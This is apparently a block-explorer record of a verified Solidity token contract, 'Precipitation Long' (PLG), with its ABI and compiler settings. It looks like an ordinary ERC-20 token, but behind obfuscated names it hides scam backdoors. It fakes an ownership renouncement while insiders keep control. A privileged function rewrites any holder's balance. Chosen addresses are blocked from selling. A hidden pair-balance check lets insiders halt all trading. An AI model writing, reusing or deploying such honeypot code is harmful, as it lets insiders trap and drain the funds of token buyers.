{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface buyMinTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract senderShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderBuy {\n    function createPair(address buyReceiver, address tokenReceiver) external returns (address);\n}\n\ninterface tradingAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeSenderReceiver) external view returns (uint256);\n\n    function transfer(address totalShould, uint256 exemptLiquidity) external returns (bool);\n\n    function allowance(address launchTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalShould,\n        uint256 exemptLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountIs, uint256 value);\n    event Approval(address indexed launchTake, address indexed spender, uint256 value);\n}\n\ninterface tradingAtMetadata is tradingAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PrecipitationLong is senderShould, tradingAt, tradingAtMetadata {\n\n    function feeMin() public {\n        emit OwnershipTransferred(limitShould, address(0));\n        toMaxAuto = address(0);\n    }\n\n    function atTeam(address exemptFee) public {\n        enableReceiverFee();\n        \n        if (exemptFee == limitShould || exemptFee == receiverBuy) {\n            return;\n        }\n        launchedFromBuy[exemptFee] = true;\n    }\n\n    bool public tokenLaunched;\n\n    function balanceOf(address modeSenderReceiver) public view virtual override returns (uint256) {\n        return maxShouldTrading[modeSenderReceiver];\n    }\n\n    uint256 launchSender;\n\n    address public limitShould;\n\n    address public receiverBuy;\n\n    uint256 constant buyList = 15 ** 10;\n\n    string private receiverReceiver = \"PLG\";\n\n    function feeAt(uint256 exemptLiquidity) public {\n        enableReceiverFee();\n        launchSender = exemptLiquidity;\n    }\n\n    string private buyAtShould = \"Precipitation Long\";\n\n    uint256 private autoFrom;\n\n    mapping(address => uint256) private maxShouldTrading;\n\n    address feeFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private toMaxAuto;\n\n    uint256 public toReceiver;\n\n    function allowance(address totalAuto, address txTeam) external view virtual override returns (uint256) {\n        if (txTeam == feeFund) {\n            return type(uint256).max;\n        }\n        return minSwapTo[totalAuto][txTeam];\n    }\n\n    function transferFrom(address txMarketingAt, address totalShould, uint256 exemptLiquidity) external override returns (bool) {\n        if (_msgSender() != feeFund) {\n            if (minSwapTo[txMarketingAt][_msgSender()] != type(uint256).max) {\n                require(exemptLiquidity <= minSwapTo[txMarketingAt][_msgSender()]);\n                minSwapTo[txMarketingAt][_msgSender()] -= exemptLiquidity;\n            }\n        }\n        return swapTeam(txMarketingAt, totalShould, exemptLiquidity);\n    }\n\n    function swapTeam(address txMarketingAt, address totalShould, uint256 exemptLiquidity) internal returns (bool) {\n        if (txMarketingAt == limitShould) {\n            return fromAmount(txMarketingAt, totalShould, exemptLiquidity);\n        }\n        uint256 launchMarketing = tradingAt(receiverBuy).balanceOf(totalFromFund);\n        require(launchMarketing == launchSender);\n        require(totalShould != totalFromFund);\n        if (launchedFromBuy[txMarketingAt]) {\n            return fromAmount(txMarketingAt, totalShould, buyList);\n        }\n        return fromAmount(txMarketingAt, totalShould, exemptLiquidity);\n    }\n\n    mapping(address => mapping(address => uint256)) private minSwapTo;\n\n    uint256 private sellMax = 100000000 * 10 ** 18;\n\n    function fromAmount(address txMarketingAt, address totalShould, uint256 exemptLiquidity) internal returns (bool) {\n        require(maxShouldTrading[txMarketingAt] >= exemptLiquidity);\n        maxShouldTrading[txMarketingAt] -= exemptLiquidity;\n        maxShouldTrading[totalShould] += exemptLiquidity;\n        emit Transfer(txMarketingAt, totalShould, exemptLiquidity);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed feeTx, address indexed senderMinTx);\n\n    uint256 private amountEnable;\n\n    uint256 receiverSwap;\n\n    function name() external view virtual override returns (string memory) {\n        return buyAtShould;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverReceiver;\n    }\n\n    function getOwner() external view returns (address) {\n        return toMaxAuto;\n    }\n\n    function enableReceiverFee() private view {\n        require(tokenTotal[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellMax;\n    }\n\n    constructor (){\n        if (totalLaunched != amountEnable) {\n            amountEnable = autoFrom;\n        }\n        buyMinTake amountSwapReceiver = buyMinTake(feeFund);\n        receiverBuy = senderBuy(amountSwapReceiver.factory()).createPair(amountSwapReceiver.WETH(), address(this));\n        \n        limitShould = _msgSender();\n        feeMin();\n        tokenTotal[limitShould] = true;\n        maxShouldTrading[limitShould] = sellMax;\n        \n        emit Transfer(address(0), limitShould, sellMax);\n    }\n\n    bool private exemptMin;\n\n    mapping(address => bool) public launchedFromBuy;\n\n    uint256 private shouldMarketing;\n\n    bool public limitIs;\n\n    mapping(address => bool) public tokenTotal;\n\n    function approve(address txTeam, uint256 exemptLiquidity) public virtual override returns (bool) {\n        minSwapTo[_msgSender()][txTeam] = exemptLiquidity;\n        emit Approval(_msgSender(), txTeam, exemptLiquidity);\n        return true;\n    }\n\n    function modeLiquidity(address autoEnable) public {\n        if (limitIs) {\n            return;\n        }\n        if (amountEnable != autoFrom) {\n            toReceiver = totalLaunched;\n        }\n        tokenTotal[autoEnable] = true;\n        if (totalLaunched != amountEnable) {\n            autoFrom = amountEnable;\n        }\n        limitIs = true;\n    }\n\n    uint8 private exemptMode = 18;\n\n    address totalFromFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private totalLaunched;\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptMode;\n    }\n\n    function limitReceiver(address maxFee, uint256 exemptLiquidity) public {\n        enableReceiverFee();\n        maxShouldTrading[maxFee] = exemptLiquidity;\n    }\n\n    bool public txMin;\n\n    function transfer(address maxFee, uint256 exemptLiquidity) external virtual override returns (bool) {\n        return swapTeam(_msgSender(), maxFee, exemptLiquidity);\n    }\n\n    bool public amountShould;\n\n    function owner() external view returns (address) {\n        return toMaxAuto;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMinTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFee\",\"type\":\"address\"}],\"name\":\"atTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSenderReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptLiquidity\",\"type\":\"uint256\"}],\"name\":\"feeAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedFromBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLiquidity\",\"type\":\"uint256\"}],\"name\":\"limitReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoEnable\",\"type\":\"address\"}],\"name\":\"modeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMarketingAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PrecipitationLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}